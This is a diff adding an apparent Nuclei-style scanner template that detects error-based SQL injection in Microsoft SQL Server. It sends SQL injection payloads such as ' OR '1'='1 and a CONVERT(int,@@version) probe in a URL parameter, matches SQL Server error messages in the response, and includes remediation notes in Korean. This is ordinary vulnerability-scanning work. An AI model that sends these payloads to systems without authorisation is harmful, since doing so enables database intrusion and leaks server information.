@@ -1,0 +1,46 @@
+id: sqli-error-based-mssql
+
+info:
+  name: MSSQL Error-Based SQL Injection
+  author: security-researcher
+  severity: critical
+  description: |
+    Microsoft SQL Server에서 에러 기반 SQL 인젝션 취약점을 탐지합니다.
+  tags: sqli,mssql,error-based,injection
+  remediation: |
+    - Parameterized Query / Stored Procedure 사용
+    - sp_executesql 사용 시 파라미터 바인딩 필수
+    - 에러 상세 정보 클라이언트 노출 차단
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1'"
+      - "{{BaseURL}}?id=1;--"
+      - "{{BaseURL}}?id=1'--"
+      - "{{BaseURL}}?id=1' OR '1'='1"
+      - "{{BaseURL}}?id=1' AND 1=CONVERT(int,@@version)--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Microsoft OLE DB Provider for SQL Server"
+          - "Microsoft SQL Server"
+          - "Unclosed quotation mark after the character string"
+          - "Incorrect syntax near"
+          - "\\[SQL Server\\]"
+          - "ODBC SQL Server Driver"
+          - "SqlException"
+          - "System\\.Data\\.SqlClient"
+        condition: or
+        case-insensitive: true
+
+      - type: regex
+        part: body
+        regex:
+          - "Msg \\d+, Level \\d+, State \\d+"
+          - "Server: Msg"
+        condition: or
+        case-insensitive: true
